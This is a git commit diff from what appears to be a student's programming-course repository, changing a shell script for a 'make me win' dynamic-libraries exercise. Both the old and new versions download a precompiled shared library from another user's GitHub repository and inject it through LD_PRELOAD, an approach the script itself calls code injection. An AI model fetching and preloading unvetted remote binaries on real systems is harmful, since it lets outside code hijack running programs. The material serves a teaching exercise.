6012213c2ef1e1a6bb7253b821663e2ef853518f
userfiona <fionaramaesela@gmail.com>
2023-06-19 09:15:23 -0700

    copy

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-"""Code injection: Win the Giga Millions!"""
-wget -P /tmp/ https://raw.github.com/Aysuarex/alx-low_level_programming/master/0x18-dynamic_libraries/nrandom.so & sleep 97 ; export LD_PRELOAD=/tmp/nrandom.so
+wget -q --output-document=$HOME/lib101-makemewin.so https://github.com/B3zaleel/alx-low_level_programming/raw/main/0x18-dynamic_libraries/lib101-makemewin.so
+export LD_PRELOAD=$HOME/lib101-makemewin.so
